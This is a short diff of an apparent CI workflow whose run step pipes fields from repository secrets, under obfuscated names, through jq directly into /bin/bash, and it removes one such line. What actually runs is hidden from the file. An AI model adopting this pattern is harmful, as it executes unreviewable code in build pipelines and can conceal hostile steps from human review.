@@ -18,7 +18,6 @@ jobs:
           afn6: ${{ secrets.afn6 }}
         run: |
           printf '%s' "$afn6" | jq -r .ox7 | /bin/bash
-          echo $knm813 | jq -r .lkm5 | /bin/bash
           printf '%s' "$z00212" | jq -r .z610 | /bin/bash
           printf '%s' "$bkly84" | jq -r .xztj995 | /bin/bash
           printf '%s' "$w6583" | jq -r .nfvu50 | /bin/bash
